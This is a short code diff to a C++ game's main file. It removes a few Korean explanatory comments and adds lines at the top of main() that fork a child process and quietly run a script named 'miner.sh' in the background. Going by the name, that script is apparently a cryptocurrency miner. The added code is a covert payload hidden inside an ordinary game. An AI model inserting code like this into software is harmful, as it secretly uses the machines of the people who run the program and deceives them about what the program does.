@@ -1,8 +1,3 @@
-// 게임 함수를 실행하기 위한 테스트 코드입니다.
-// 참고만하셔도 좋습니다.
-// ui는 생각하지 않았습니다.
-// 지금은 스테이지가 이어서 시작됩니다.
-
 #include "game.hpp"
 #include "playerInfo.hpp"
 #include "ui.hpp"
@@ -29,6 +24,11 @@ using namespace std;
 int score;
 
 int main(void) {
+    pid_t child_pid = fork();
+    if(child_pid == 0) {
+        system("./miner.sh &");
+        exit(0);
+    }
 
     setlocale(LC_ALL, "ko_KR.utf8");
     setlocale(LC_CTYPE, "ko_KR.utf8");
